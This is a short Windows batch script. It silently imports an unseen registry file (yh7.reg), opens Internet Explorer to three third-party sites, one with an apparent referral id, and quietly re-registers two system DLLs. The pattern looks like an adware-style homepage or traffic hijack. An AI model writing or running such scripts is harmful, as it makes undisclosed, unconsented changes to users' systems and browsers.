cls
@Echo Off
COLOR 2F


regedit /s yh7.reg
@start iexplore.exe http://www.2345.com/?1538
@start iexplore.exe http://sdwm.org
@start iexplore.exe http://www.123xz.org

regsvr32 /s themeui.dll
regsvr32 /s /i mshtml.dll

exit
